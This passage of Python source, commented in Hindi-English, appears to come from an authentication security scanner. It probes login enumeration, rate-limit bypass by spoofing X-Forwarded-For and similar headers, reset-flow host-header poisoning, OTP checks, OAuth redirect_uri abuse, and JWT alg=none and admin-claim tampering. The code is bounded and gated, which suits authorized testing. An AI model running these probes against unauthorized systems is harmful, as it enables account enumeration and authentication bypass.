            res.update({"locked_out": True, "locked_out_reason": why})
            res["summary"] = "%d attempts ke baad lockout (%s)." % (res["attempts"], why)
            return res
        sig = drf_compare(base_r, r)
        timing_plausible.append(r.elapsed)
        if sig.get("json_oracle"):
            json_oracle_hits.append({"identifier": user, "json_a": sig.get("json_a"),
                                     "json_b": sig.get("json_b")})
        if worst is None or sig["diff_score"] > worst[1]["diff_score"]:
            worst = (user, sig)
        if ENUM_MSG_RE.search(r.text or ""):
            res["signals"].setdefault("message_oracle", []).append(user)
        if GENERIC_MSG_RE.search(r.text or "") and not ENUM_MSG_RE.search(r.text or ""):
            res["signals"].setdefault("generic_message_ok", []).append(user)

    for _ in range(repeats):
        if res["attempts"] >= cap + repeats:
            break
        r = _send_login(http, probe, synth_identifier("bogus"), "WaspInvalid!" + rand_str(4))
        res["attempts"] += 1
        timing_bogus.append(r.elapsed)

    tv = timing_verdict(timing_plausible, timing_bogus,
                        alpha=float(conf.get("auth_stats_alpha", 0.05)),
                        resamples=int(conf.get("auth_stats_bootstrap", 400)))
    res["timing"] = tv
    if json_oracle_hits:
        res["signals"]["json_oracle"] = json_oracle_hits[:3]
    if worst:
        res["signals"]["best_drf"] = {
            "identifier": worst[0], "diff_score": worst[1]["diff_score"],
            "verdict": worst[1]["verdict"], "len_delta": worst[1]["len_delta"],
            "body_similarity": worst[1]["body_similarity"],
            "json_oracle": worst[1].get("json_oracle")}

    enum = (bool(res["signals"].get("message_oracle"))
            or bool(res["signals"].get("json_oracle"))
            or (worst and worst[1]["diff_score"] >= 30)
            or bool(tv.get("timing_anomaly")))
    res["enumeration_likely"] = bool(enum)
    res["enumeration_signals"] = [k for k in ("message_oracle", "json_oracle") if res["signals"].get(k)]
    if worst and worst[1]["diff_score"] >= 30:
        res["enumeration_signals"].append("drf_diff>=30")
    if tv.get("timing_anomaly"):
        res["enumeration_signals"].append("timing_anomaly")
    res["summary"] = ("DRF diff=%s verdict=%s | json_oracle=%s | timing=%s (delta=%.2f p=%.4f) | "
                      "msg_oracle=%s | attempts=%d" % (
                          res["signals"].get("best_drf", {}).get("diff_score"),
                          res["signals"].get("best_drf", {}).get("verdict"),
                          bool(res["signals"].get("json_oracle")),
                          tv.get("verdict"), tv.get("cliffs_delta", 0.0), tv.get("mw_p", 1.0),
                          bool(res["signals"].get("message_oracle")), res["attempts"]))
    return res

def _build_login_request(probe, identifier, password):
    """Parsed form se login request banao (url, method, data, headers)."""
    forms = probe.get("forms") or []
    form = next((f for f in forms if f.get("has_password")), None)
    url = probe.get("final_url") or probe.get("url")
    if form:
        url = form["action"]
        user_f, pass_f = guess_fields(form["field_names"])
        data = {user_f or "username": identifier, pass_f or "password": password}
        for cf in form.get("csrf_fields", []):
            for fld in form.get("fields", []):
                if fld["name"] == cf and fld.get("value"):
                    data[cf] = fld["value"]
        return url, form["method"], data, {"Content-Type": "application/x-www-form-urlencoded"}
    return url, "POST", {"username": identifier, "email": identifier, "password": password}, \
        {"Content-Type": "application/json"}

def _send_login(http, probe, identifier, password, extra_headers=None):
    # v10 FIX: failed login attempts server state mutate nahi karte ->
    # read_only_post=True (mod_tech precedent). Bina iske ULTRA core ka
    # Layer-4 RWX gate ScopeError raise karta tha -> poora module crash (v9 bug).
    url, method, data, headers = _build_login_request(probe, identifier, password)
    h = dict(headers)
    h.update(extra_headers or {})
    if method == "GET":
        q = urllib.parse.urlencode(data)
        return http.request("GET", url + ("&" if "?" in url else "?") + q, headers=h,
                            allow_redirects=False, read_only_post=True)
    body = (json.dumps(data) if "json" in h.get("Content-Type", "")
            else urllib.parse.urlencode(data)).encode()
    return http.request(method, url, headers=h, data=body, allow_redirects=False,
                        read_only_post=True)


# ---------------------------------------------------------------------------
# STAGE E - RATE LIMIT / LOCKOUT MODEL
# ---------------------------------------------------------------------------

def rate_limit_probe(http, scope, url, probe, conf):
    """
    Bounded burst -> throttle engage hota hai ya nahi.
    v9 me lockout MODEL bhi classify hota hai (per-account / per-IP / global).
    """
    res = {"endpoint": url, "attempts": 0, "throttled": False, "locked_out": False,
           "status_series": [], "timing_ms": [], "signals": [], "identifiers_used": [],
           "lockout_model": "none", "lockout_reason": ""}
    cap = int(conf["auth_max_attempts"])
    reasons = []
    for i in range(cap):
        ident = "wasp-rl-%s@%s" % (rand_str(4), SYNTH_DOMAIN) if i % 2 == 0 else "wasp-rl-%s@%s" % (rand_str(4), SYNTH_DOMAIN)
        res["identifiers_used"].append(ident)
        r = _send_login(http, probe, ident, "WaspInvalid!" + rand_str(4))
        res["attempts"] += 1
        res["status_series"].append(r.status)
        res["timing_ms"].append(round(r.elapsed * 1000, 1))
        lo, why = detect_lockout(r.status, r.text, r.headers)
        reasons.append(why)
        if lo:
            res["throttled"] = True
            res["locked_out"] = (r.status in (423, 429)) or ("lock" in why or "too many" in why)
            res["lockout_reason"] = why
            res["signals"].append(why)
            break
    if not res["throttled"] and len(res["timing_ms"]) >= 4:
        first, last = median(res["timing_ms"][:2]), median(res["timing_ms"][-2:])
        if last > max(200.0, first * 3.0):
            res["throttled"] = True
            res["signals"].append("progressive-delay")
    res["lockout_model"], res["lockout_model_note"] = classify_lockout_model(
        res["status_series"], reasons, res["identifiers_used"])
    res["summary"] = ("%d attempts | statuses=%s | throttled=%s | model=%s | signals=%s" % (
        res["attempts"], res["status_series"], res["throttled"], res["lockout_model"],
        res["signals"]))
    return res


# ---------------------------------------------------------------------------
# STAGE F - BYPASS MATRIX v2 (interleaved control probe)
# ---------------------------------------------------------------------------

def rate_limit_bypass_matrix(http, scope, url, probe, conf):
    """
    v1 ka bug: 'not throttled' ko hi bypass maan leta tha, aur control probe
    nahi tha - isliye agar endpoint par throttle hi na ho to bhi 'bypass_likely'
    aa jata tha. v2:
      * pehle ek CONTROL probe (no header, same identifier) bhejo
      * phir mutation probes
      * bypass tab hi claim karo jab mutation pass ho AUR control bhi pass ho
        (matlab throttle kabhi laga hi nahi), ya jab control BLOCK ho aur
        mutation PASS ho (matlab throttle actually bypass hua)
    """
    out = {"probes": [], "bypass_likely": False, "control": {}, "summary": "",
           "bypass_type": None}
    n = int(conf["auth_bypass_probes"])
    domain = SYNTH_DOMAIN
    variants = normalize_username_variants("waspuser", domain)

    # --- control probe ---
    ctrl = _send_login(http, probe, variants["original"], "WaspInvalid!" + rand_str(4))
    ctrl_lo, ctrl_why = detect_lockout(ctrl.status, ctrl.text, ctrl.headers)
    out["control"] = {"status": ctrl.status, "throttled": ctrl_lo, "signal": ctrl_why,
                      "identifier": variants["original"]}

    header_sets = [{"X-Forwarded-For": "127.0.0.%d" % (10 + i)} for i in range(4)]
    header_sets += [{"X-Real-IP": "127.0.0.%d" % (20 + i)} for i in range(2)]
    header_sets += [{"X-Originating-IP": "127.0.0.%d" % (30 + i)} for i in range(2)]
    header_sets += [{"X-Client-IP": "127.0.0.%d" % (40 + i)} for i in range(2)]

    header_pass, ident_pass = 0, 0
    for i in range(min(n, len(header_sets))):
        r = _send_login(http, probe, variants["original"], "WaspInvalid!" + rand_str(4), header_sets[i])
        lo, why = detect_lockout(r.status, r.text, r.headers)
        passed = (not lo) and r.status not in (401, 403)
        if passed:
            header_pass += 1
        out["probes"].append({"type": "header", "headers": header_sets[i], "status": r.status,
                              "throttled": lo, "passed": passed, "signal": why})
    for name in ("upper", "plus_tag", "dot_variant", "trailing_space", "double_at", "unicode_fullwidth"):
        r = _send_login(http, probe, variants[name], "WaspInvalid!" + rand_str(4))
        lo, why = detect_lockout(r.status, r.text, r.headers)
        passed = (not lo) and r.status not in (401, 403)
        if passed:
            ident_pass += 1
        out["probes"].append({"type": "identifier", "variant": name, "status": r.status,
                              "throttled": lo, "passed": passed, "signal": why})

    ctrl_passed = (not ctrl_lo) and ctrl.status not in (401, 403)
    if ctrl_passed:
        # throttle kabhi engage hi nahi hua -> bypass claim nahi kar sakte
        out["bypass_likely"] = False
        out["bypass_type"] = "no-throttle-to-bypass"
        out["summary"] = ("control probe bhi pass hua -> throttling observe nahi hui; "
                          "bypass claim REJECT (header_pass=%d ident_pass=%d)" % (header_pass, ident_pass))
    else:
        # control block hua; agar mutation pass hua to real bypass
        if header_pass or ident_pass:
            out["bypass_likely"] = True
            out["bypass_type"] = ("header-rotation" if header_pass and not ident_pass else
                                  "identifier-normalization" if ident_pass and not header_pass else
                                  "header+identifier")
            out["summary"] = ("control BLOCK hua par %d header / %d identifier probe pass -> "
                              "bypass likely (%s)" % (header_pass, ident_pass, out["bypass_type"]))
        else:
            out["bypass_likely"] = False
            out["bypass_type"] = "throttle-holds"
            out["summary"] = "control aur saare mutation probes block hue -> throttling effective hai"
    return out


# ---------------------------------------------------------------------------
# STAGE G - PASSWORD RESET FLOW
# ---------------------------------------------------------------------------

def reset_flow_analysis(http, scope, url, probe, conf):
    """
    Reset flow analysis (safe):
      1) synthetic identifier -> generic message check (enumeration)
      2) Host header injection check
      3) token sampling + per-position entropy / Hamming (agar token HTTP me aaye)
      4) (opt-in) real-looking identifier probe - default OFF
    """
    res = {"endpoint": url, "probes": [], "token": {}, "host_header_reflected": False,
           "header_variants": [], "token_in_response": False,
           "enumeration_likely": False, "generic_message": None, "summary": ""}
    forms = probe.get("forms") or []
    form = forms[0] if forms else None
    action = form["action"] if form else (probe.get("final_url") or url)
    method = (form["method"] if form else "POST")
    field_names = (form["field_names"] if form else ["email"])

    def build(ident, extra_headers=None):
        d = {}
        uf, _ = guess_fields(field_names)
        d[uf or "email"] = ident
        for cf in (form.get("csrf_fields") if form else []):
            for fld in (form.get("fields") if form else []):
                if fld["name"] == cf and fld.get("value"):
                    d[cf] = fld["value"]
        body = urllib.parse.urlencode(d).encode()
        h = {"Content-Type": "application/x-www-form-urlencoded"}
        h.update(extra_headers or {})
        return action, method, body, h

    # 1) synthetic -> generic vs leak (synthetic ident -> koi real state change nahi)
    syn = synth_identifier("reset")
    a, m, b, h = build(syn)
    r1 = http.request(m, a, headers=h, data=b, allow_redirects=False, read_only_post=True)
    gen = bool(GENERIC_MSG_RE.search(r1.text or ""))
    leak = bool(ENUM_MSG_RE.search(r1.text or ""))
    res["generic_message"] = gen
    res["probes"].append({"ident": "synthetic", "status": r1.status, "len": len(r1.body),
                          "generic_message": gen, "leaks": leak,
                          "debug_leak": bool(DEBUG_LEAK_RE.search(r1.text or ""))})
    res["enumeration_likely"] = leak

    # 2) host header injection (v10: konsa header reflect hua wo bhi record hota hai)
    evil = "wasp-inject-%s.attacker-invalid.test" % rand_str(4)
    poison_headers = ["X-Forwarded-Host", "X-Host", "X-Forwarded-Server"]
    a2, m2, b2, h2 = build(syn, {h: evil for h in poison_headers})
    r2 = http.request(m2, a2, headers=h2, data=b2, allow_redirects=False, read_only_post=True)
    reflected = evil in (r2.text or "")
    loc = r2.header("Location") or ""
    res["host_header_reflected"] = bool(reflected or (evil in loc))
    res["poison_headers_used"] = list(poison_headers)
    res["probes"].append({"type": "host-header", "injected": evil, "reflected": reflected,
                          "headers": poison_headers, "location": loc[:160], "status": r2.status})

    # 2b) v10 per-header variants (X-Original-URL + X-Forwarded-Proto) - gated
    if conf.get("auth_allow_header_poison", True):
        evil2 = "wasp-orig-%s.attacker-invalid.test" % rand_str(4)
        for variant, hdrs in (("x-original-url", {"X-Original-URL": "https://%s/reset" % evil2}),
                              ("x-forwarded-proto", {"X-Forwarded-Proto": "http"})):
            av, mv, bv, hv = build(syn, hdrs)
            rv = http.request(mv, av, headers=hv, data=bv, allow_redirects=False,
                              read_only_post=True)
            hitv = (evil2 in (rv.text or "")) or (evil2 in (rv.header("Location") or ""))
            protov = variant == "x-forwarded-proto" and "http://" in (rv.text or "")[:4000] \
                and "https://" not in (rv.text or "")[:4000]
            if hitv or protov:
                res["header_variants"].append({"variant": variant, "reflected": bool(hitv),
                                               "proto_downgrade": bool(protov),
                                               "status": rv.status})
            res["probes"].append({"type": "header-variant:%s" % variant, "status": rv.status,
                                  "reflected": bool(hitv)})

    # 3) token sampling
    toks = []
    for i in range(int(conf["auth_reset_token_samples"])):
        a3, m3, b3, h3 = build("wasp-token-%s@%s" % (rand_str(5), SYNTH_DOMAIN))
        r3 = http.request(m3, a3, headers=h3, data=b3, allow_redirects=False,
                          read_only_post=True)
        found = re.findall(r"(?i)(?:token|code|key|reset|otp)[=\"\s:]+([A-Za-z0-9._\-]{12,})", r3.text or "")
        found += re.findall(r"/([A-Za-z0-9._\-]{16,})(?:[\"'/]|$)", r3.text or "")
        if found:
            toks.append(found[0])
    if toks:
        res["token"] = token_predictability(toks)
        res["token_in_response"] = True
    else:
        res["token"] = {"samples": 0,
                        "note": "HTTP response me token nahi aaya (email-based reset me normal hai) - "
                                "isliye 'weak nahi' mat maano, sirf 'detect nahi hua'"}

    # 4) opt-in: plausible identifier probe (default OFF - real users ko email jaa sakta hai)
    # NOTE: ye server-state create kar sakta hai -> Layer-4 write gate ka respect karta hai
    # (allow_write_http=true master switch ke bina yeh block hoga, crash nahi).
    if conf.get("auth_allow_reset_plausible_probe"):
        a4, m4, b4, h4 = build("admin@" + (_authorized_hosts(scope) or ["example.com"])[0])
        try:
            r4 = http.request(m4, a4, headers=h4, data=b4, allow_redirects=False)
            res["plausible_probe"] = {"status": r4.status, "len": len(r4.body),
                                      "leaks": bool(ENUM_MSG_RE.search(r4.text or "")),
                                      "note": "opt-in tha; real mailbox par email jaa sakta hai"}
        except ScopeError:
            res["plausible_probe"] = {"blocked": True,
                                      "note": "READ-ONLY core ne block kiya - "
                                              "allow_write_http=true chahiye (sahi behaviour)"}

    res["summary"] = ("generic_msg=%s | leak=%s | host_header_reflected=%s | variants=%d | "
                      "token_in_response=%s | token=%s" % (
                          gen, leak, res["host_header_reflected"], len(res["header_variants"]),
                          res["token_in_response"], res["token"].get("weak", "n/a")))
    return res


# ---------------------------------------------------------------------------
# STAGE H - MFA / OTP
# ---------------------------------------------------------------------------

def mfa_flow_analysis(http, scope, url, probe, conf):
    """Status oracle + JSON oracle + OTP shape (form attributes) + throttling."""
    res = {"endpoint": url, "status_oracle": False, "no_ratelimit": False,
           "locked_out": False, "otp_shape": {}, "summary": ""}
    forms = probe.get("forms") or []
    form = forms[0] if forms else None
    action = form["action"] if form else (probe.get("final_url") or url)
    field_names = (form.get("field_names") if form else ["otp", "code"])
    otp_field = guess_otp_field(field_names)

    # OTP shape from form attributes (client-side hints - strong signal)
    shape = {"field": otp_field}
    for fld in (form.get("fields") if form else []):
        if fld["name"] == otp_field:
            shape.update({"maxlength": fld.get("maxlength"), "pattern": fld.get("pattern"),
                          "inputmode": fld.get("inputmode", ""), "autocomplete": fld.get("autocomplete")})
    res["otp_shape"] = shape
    lengths = set()
    if shape.get("maxlength"):
        try:
            lengths.add(int(shape["maxlength"]))
        except Exception:
            pass
    if shape.get("pattern"):
        m = re.search(r"\{(\d+)\}", shape["pattern"])
        if m:
            lengths.add(int(m.group(1)))
    if lengths and max(lengths) <= 4:
        res["weak_otp_policy"] = True
        res["otp_shape"]["weak_reason"] = "OTP length %s -> brute-force feasible" % sorted(lengths)

    shapes = ["000000", "123456", "abcdef", "0" * 4, "0000"]
    statuses, errs, json_oracles = [], [], []
    cap = min(5, int(conf["auth_max_attempts"]))
    for s in shapes[:cap]:
        d = {otp_field: s}
        for cf in (form.get("csrf_fields") if form else []):
            for fld in (form.get("fields") if form else []):
                if fld["name"] == cf and fld.get("value"):
                    d[cf] = fld["value"]
        body = urllib.parse.urlencode(d).encode()
        r = http.request((form["method"] if form else "POST"), action,
                         headers={"Content-Type": "application/x-www-form-urlencoded"},
                         data=body, allow_redirects=False, read_only_post=True)
        statuses.append(r.status)
        lo, why = detect_lockout(r.status, r.text, r.headers)
        if lo:
            res["locked_out"] = True
            res["summary"] = "OTP endpoint throttled after %d probes (%s)" % (len(statuses), why)
            res["status_series"] = statuses
            return res
        j = r.json(None)
        if isinstance(j, dict):
            es = _json_error_shape(j)
            if es:
                json_oracles.append(es)
        m = re.search(r"(expired|invalid|incorrect|wrong|not\s+valid|already\s+used|too\s+many)", r.text or "", re.I)
        if m:
            errs.append(re.sub(r"\s+", " ", m.group(1)).lower())
    res["status_oracle"] = len(set(statuses)) > 1
    res["no_ratelimit"] = len(statuses) >= cap
    res["status_series"] = statuses
    res["error_tokens"] = sorted(set(errs))
    if len(json_oracles) >= 2 and len({json.dumps(x, sort_keys=True) for x in json_oracles}) > 1:
        res["json_oracle"] = True
    res["summary"] = ("statuses=%s | distinct=%d | errors=%s | json_oracle=%s | weak_policy=%s" % (
        statuses, len(set(statuses)), sorted(set(errs)), res.get("json_oracle", False),
        res.get("weak_otp_policy", False)))
    return res


# ---------------------------------------------------------------------------
# STAGE I - REGISTRATION
# ---------------------------------------------------------------------------

def registration_analysis(http, scope, url, probe, conf):
    """Static policy inference always; duplicate probe sirf opt-in par."""
    res = {"endpoint": url, "static": {}, "probe": None, "enumeration_likely": False,
           "summary": ""}
    forms = probe.get("forms") or []
    form = next((f for f in forms if f.get("has_password")), forms[0] if forms else None)
    if not form:
        res["summary"] = "registration form nahi mila (API-only ho sakta hai)"
        return res
    uf, pf = guess_fields(form["field_names"])
    res["static"] = {
        "action": form["action"], "method": form["method"], "enctype": form.get("enctype", ""),
        "identifier_field": uf, "password_field": pf, "csrf_fields": form.get("csrf_fields", []),
        "password_count": form.get("password_count", 0),
        "has_confirm_password": form.get("password_count", 0) > 1,
        "client_side_validation": bool(re.search(
            r"(required|pattern=|minlength|maxlength)", json.dumps(form), re.I)),
        "policy_hint": _password_policy_hint(forms),
    }
    res["open_registration"] = True
    if not conf.get("auth_allow_registration_probe"):
        res["summary"] = "static-only (auth_allow_registration_probe=true karne par duplicate probe hoga)"
        return res
    ident = "wasp-reg-%s@%s" % (rand_str(6), SYNTH_DOMAIN)
    d = {uf or "email": ident, pf or "password": "WaspTest!%s" % rand_str(4)}
    for cf in form.get("csrf_fields", []):
        for fld in form.get("fields", []):
            if fld["name"] == cf and fld.get("value"):
                d[cf] = fld["value"]
    body = urllib.parse.urlencode(d).encode()
    h = {"Content-Type": "application/x-www-form-urlencoded"}
    # registration DUPLICATE probe server-state banata hai -> write-gate respect:
    # allow_write_http=false (default) par gracefully blocked, crash nahi.
    try:
        r1 = http.request(form["method"], form["action"], headers=h, data=body,
                          allow_redirects=False)
        r2 = http.request(form["method"], form["action"], headers=h, data=body,
                          allow_redirects=False)
    except ScopeError:
        res["probe"] = {"blocked": True,
                        "note": "duplicate-registration probe READ-ONLY gate se blocked "
                                "(allow_write_http=true opt-in chahiye - sahi behaviour)"}
        res["summary"] = "static-only (write-gate ne state-changing probe block kiya)"
        return res
    sig = drf_compare(r1, r2)
    res["probe"] = {"first_status": r1.status, "second_status": r2.status, "drf": sig}
    if (ENUM_MSG_RE.search(r2.text or "") and sig["diff_score"] >= 12) or sig.get("json_oracle"):
        res["enumeration_likely"] = True
    res["summary"] = "duplicate reg DRF diff=%s verdict=%s json_oracle=%s" % (
        sig["diff_score"], sig["verdict"], sig.get("json_oracle"))
    return res


# ---------------------------------------------------------------------------
# STAGE J - OAUTH / OIDC
# ---------------------------------------------------------------------------

def oauth_discovery(http, scope, oidc_urls, conf=None):
    """v10: + PKCE-downgrade surface, signing-alg inventory, mix-up indicator,
    redirect_uri path-traversal variant (gated), probe cap (auth_oauth_probes)."""
    conf = conf or {}
    out = {"discovery_urls": list(oidc_urls), "documents": {}, "redirect_uri_loose": False,
           "no_pkce": False, "implicit_flow": False, "missing_state": False,
           "pkce_downgrade_surface": False, "mixup_indicator": False,
           "redirect_path_variant": None, "summary": ""}
    issuers, authz_eps = [], []
    probe_budget = max(1, int(conf.get("auth_oauth_probes", 4)))
    for u in oidc_urls:
        r = http.request("GET", u, allow_redirects=True)
        if not r.status or r.status >= 400:
            continue
        try:
            doc = json.loads(r.text)
        except Exception:
            continue
        keep = ("issuer", "authorization_endpoint", "token_endpoint", "userinfo_endpoint",
                "jwks_uri", "registration_endpoint", "end_session_endpoint",
                "scopes_supported", "response_types_supported",
                "code_challenge_methods_supported", "grant_types_supported",
                "response_modes_supported", "token_endpoint_auth_methods_supported",
                "id_token_signing_alg_values_supported", "claims_supported")
        out["documents"][u] = {k: doc.get(k) for k in keep if k in doc}
        issuer = doc.get("issuer")
        if issuer:
            issuers.append(str(issuer))
        pkce = doc.get("code_challenge_methods_supported") or []
        out["no_pkce"] = not bool(pkce)
        out["pkce_downgrade_surface"] = bool(pkce) and "S256" in [str(x).upper() for x in pkce]
        rt = doc.get("response_types_supported") or []
        out["implicit_flow"] = any(("token" in str(x) or "id_token" in str(x)) and "code" not in str(x)
                                   for x in rt)
        out["id_token_algs"] = [str(x) for x in (doc.get("id_token_signing_alg_values_supported") or [])]
        # redirect_uri validation probe (redirect follow NAHI karte; budget-bound)
        authz = doc.get("authorization_endpoint")
        if authz and len(authz_eps) < probe_budget:
            authz_eps.append(authz)
            evil = "https://wasp-invalid-%s.attacker-invalid.test/cb" % rand_str(4)
            q = urllib.parse.urlencode({"client_id": "wasp-probe", "response_type": "code",
                                        "redirect_uri": evil, "scope": "openid",
                                        "state": rand_str(8), "nonce": rand_str(8)})
            rr = http.request("GET", authz + ("&" if "?" in authz else "?") + q, allow_redirects=False)
            loc = rr.header("Location") or ""
            loose = (evil in loc) or (rr.status in (200, 302) and "error" not in (loc + rr.text).lower())
            out["redirect_uri_probe"] = {"url": authz, "status": rr.status,
                                         "location": loc[:200], "loose": bool(loose)}
            out["redirect_uri_loose"] = bool(loose)
            # state param requirement check
            if len(authz_eps) < probe_budget:
                q2 = urllib.parse.urlencode({"client_id": "wasp-probe", "response_type": "code",
                                             "redirect_uri": evil, "scope": "openid"})
                rr2 = http.request("GET", authz + ("&" if "?" in authz else "?") + q2,
                                   allow_redirects=False)
                loc2 = rr2.header("Location") or ""
                out["missing_state"] = bool(rr2.status in (200, 302) and "state" not in loc2.lower()
                                            and "error" not in (loc2 + rr2.text).lower())
            # v10: path-traversal variant (strict validation ko /../ se test karo) - gated
            if conf.get("auth_allow_oauth_variants", True) and not loose \
                    and len(authz_eps) < probe_budget:
                evil3 = "https://%s.attacker-invalid.test/cb" % rand_str(4)
                trav = doc.get("issuer") or "https://wasp-invalid.test"
                trav_uri = trav.rstrip("/") + "/../../" + evil3.split("//", 1)[1]
                q3 = urllib.parse.urlencode({"client_id": "wasp-probe", "response_type": "code",
                                             "redirect_uri": trav_uri, "scope": "openid",
                                             "state": rand_str(8)})
                rr3 = http.request("GET", authz + ("&" if "?" in authz else "?") + q3,
                                   allow_redirects=False)
                loc3 = rr3.header("Location") or ""
                accepted = ("attacker-invalid.test" in loc3) or \
                           (rr3.status in (200, 302) and "error" not in (loc3 + rr3.text).lower())
                out["redirect_path_variant"] = {"sent": trav_uri, "status": rr3.status,
                                                "location": loc3[:200], "accepted": bool(accepted)}
                if accepted:
                    out["redirect_uri_loose"] = True
    if len(set(issuers)) > 1:
        out["mixup_indicator"] = True
        out["issuers_seen"] = sorted(set(issuers))
    out["summary"] = ("issuer=%s | redirect_uri_loose=%s | no_pkce=%s | implicit=%s | "
                      "missing_state=%s | pkce_downgrade=%s | mixup=%s | docs=%d" % (
                          issuers[0] if issuers else "-", out["redirect_uri_loose"], out["no_pkce"],
                          out["implicit_flow"], out["missing_state"], out["pkce_downgrade_surface"],
                          out["mixup_indicator"], len(out["documents"])))
    return out

def saml_surface(http, scope, live):
    """v10: SAML surface (analysis-only) - SAMLRequest/ACS markers + metadata fetch."""
    out = {"detected": False, "markers": [], "metadata": {}, "summary": ""}
    saml_eps = [u for u, r in live.items()
                if SAML_RE.search(r.get("url") or "") or (r.get("saml_markers") or [])]
    meta_eps = [u for u in live if "saml/metadata" in u]
    if saml_eps:
        out["detected"] = True
        out["endpoints"] = saml_eps[:8]
        out["markers"] = sorted({m for u in saml_eps for m in (live[u].get("saml_markers") or [])})
    for u in meta_eps[:1]:
        r = http.request("GET", u, allow_redirects=True)
        if r.status and r.status < 400:
            eid = re.search(r"entityID=[\"']([^\"']+)", r.text or "")
            out["metadata"][u] = {"status": r.status,
                                  "entity_id": eid.group(1) if eid else None,
                                  "len": len(r.body)}
    if out["detected"] or out["metadata"]:
        out["summary"] = ("SAML surface mila: %d endpoint(s), metadata=%d - signature-wrapping "
                          "/ comment-attacks MANUAL phase me (RoE-gated)." % (
                              len(saml_eps), len(out["metadata"])))
    return out


# ---------------------------------------------------------------------------
# STAGE K - SESSION / TRANSPORT / JWT
# ---------------------------------------------------------------------------

def _is_cleartext(u):
    return urllib.parse.urlparse(u).scheme.lower() == "http"

def _jwt_tamper_probe(http, scope, endpoint, token, conf):
    """
    Gated JWT tamper probe: sirf GET endpoints par, max 2 requests.
    Do classic checks:
      1) alg=none  -> signature strip (ya empty signature)
      2) payload me privilege claim add -> purani signature ke saath
    Agar dono me se koi bhi 2xx/3xx de aur baseline 401/403 tha -> bypass signal.
    """
    res = {"attempted": False, "alg_none": {}, "claim_tamper": {}, "summary": "",
           "note": "destructive nahi; sirf read-only GET par"}
    if not conf.get("auth_allow_token_tamper_probe", True):
        res["summary"] = "disabled by config"
        return res
    parts = (token or "").split(".")
    if len(parts) < 3:
        res["summary"] = "token ke 3 segments nahi hain -> tamper skip"
        return res
    hdr = b64url_decode_json(parts[0]) or {}
    pay = b64url_decode_json(parts[1]) or {}
    base = http.request("GET", endpoint, allow_redirects=False)
    res["baseline_status"] = base.status
    if base.status is None:
        res["summary"] = "baseline GET fail hua -> tamper skip"
        return res
    res["attempted"] = True
    protected = base.status in (401, 403)

    # 1) alg=none
    h1 = dict(hdr)
    h1["alg"] = "none"
    tok1 = "%s.%s." % (b64url_encode(h1), parts[1])
    r1 = http.request("GET", endpoint, headers={"Authorization": "Bearer " + tok1},
                      allow_redirects=False)
    res["alg_none"] = {"status": r1.status,
                       "accepted": bool(r1.status and r1.status < 400 and protected)}
    # 2) claim tamper (admin=true), signature wahi purani
    p2 = dict(pay)
    p2["admin"] = True
    p2["role"] = "admin"
    p2["is_admin"] = True
    tok2 = "%s.%s.%s" % (parts[0], b64url_encode(p2), parts[2])
    r2 = http.request("GET", endpoint, headers={"Authorization": "Bearer " + tok2},
                      allow_redirects=False)
    res["claim_tamper"] = {"status": r2.status,
                           "accepted": bool(r2.status and r2.status < 400 and protected)}
    if res["alg_none"]["accepted"]:
        res["summary"] = "alg=none token ACCEPT hua (baseline %s tha)" % base.status
    elif res["claim_tamper"]["accepted"]:
        res["summary"] = "tampered payload (admin=true) ACCEPT hua - signature verify nahi ho raha"
    else:
        res["summary"] = ("tamper reject hua (baseline=%s, alg_none=%s, claim=%s) -> "
                          "signature verification lag raha hai theek" % (
                              base.status, res["alg_none"]["status"], res["claim_tamper"]["status"]))
    return res

def session_and_token_checks(http, scope, live, conf):
    """Cookies (flags + prefix rules + duplicates), transport, auth schemes, JWT."""
    cookie_report, jwt_report, scheme_report = {}, [], {}
    dup_report = {}
    for u, r in live.items():
        # cookies
        sc = r.get("set_cookie") or []
        if sc:
            cookie_report[u] = [analyze_cookie(raw, is_https=(r.get("scheme") != "http"))
                                for raw in sc]
            names = [c["name"] for c in cookie_report[u]]
            dups = sorted({n for n in names if names.count(n) > 1})
            if dups:
                dup_report[u] = dups
        # auth schemes
        wa = r.get("www_authenticate") or ""
        if wa:
            scheme_report[u] = wa
        # JWT
        for tok in (r.get("jwts") or []):
            ji = jwt_info(tok)
            ji["endpoint"] = u
            jwt_report.append(ji)
    return cookie_report, jwt_report, scheme_report, dup_report


# ---------------------------------------------------------------------------
# v10 STAGE N - INJECTION / TYPE-CONFUSION ORACLE (bounded, detection-style)
# ---------------------------------------------------------------------------

def _login_shape(r):
    """Response ka chhota fingerprint (status + json shape + len band)."""
    j = r.json(None) if hasattr(r, "json") else None
    shape = _json_error_shape(j) if isinstance(j, dict) else None
    return {"status": r.status, "len": len(r.body or b""),
            "json_shape": shape, "location": (r.header("Location") or "")[:120]}

def injection_oracle(http, scope, url, probe, conf):
    """
    Pre-auth injection oracle - SIRF synthetic identifiers:
      1) NoSQL operator (JSON $ne/$gt + form-encoded password[$ne])
      2) ek bounded 'admin' operator probe (detection; koi session use nahi hota)
      3) JSON type confusion (null / 0 / list / true)
      4) HPP (identifier double + array form)
      5) Content-Type confusion (form creds ko JSON bhejna)
      6) X-HTTP-Method-Override signal
    Signal = status ya shape MATERIALLY badla (baseline 401/403 + invalid-msg).
    auth_inject_probes budget se zyada requests KABHI nahi.
    """
    res = {"endpoint": url, "baseline": {}, "probes": [], "budget_used": 0,
           "nosql_accepted": False, "type_confusion": False, "hpp_diff": False,
           "content_type_diff": False, "summary": ""}
    budget = max(0, int(conf.get("auth_inject_probes", 10)))
    state = {"used": 0}

    def fire(label, ident, password=None, data_override=None, json_body=None,
             extra_headers=None, drop_password=False):
        if state["used"] >= budget:
            return None
        state["used"] += 1
        try:
            rurl, method, data, headers = _build_login_request(probe, ident,
                                                               password or ("WaspInvalid!" + rand_str(4)))
            if drop_password:
                data.pop("password", None)
            if data_override:
                data.update(data_override)
            h = dict(headers)
            if json_body is not None:
                h["Content-Type"] = "application/json"
                body = json.dumps(json_body).encode()
            elif any(k.endswith("[]") for k in data):
                body = urllib.parse.urlencode(data, doseq=True).encode()
            else:
                body = urllib.parse.urlencode(data).encode()
            h.update(extra_headers or {})
            r = http.request(method, rurl, headers=h, data=body, allow_redirects=False,
                             read_only_post=True)
            rec = {"label": label, "status": r.status, "shape": _login_shape(r)}
            lo, why = detect_lockout(r.status, r.text, r.headers)
            rec["throttled"] = bool(lo)
            res["probes"].append(rec)
            return r
        except Exception as e:
            res["probes"].append({"label": label, "error": truncate(repr(e), 160)})
            return None

    ident0 = synth_identifier("inj")
    base = fire("baseline", ident0, "WaspInvalid!" + rand_str(4))
    if base is None or base.status is None:
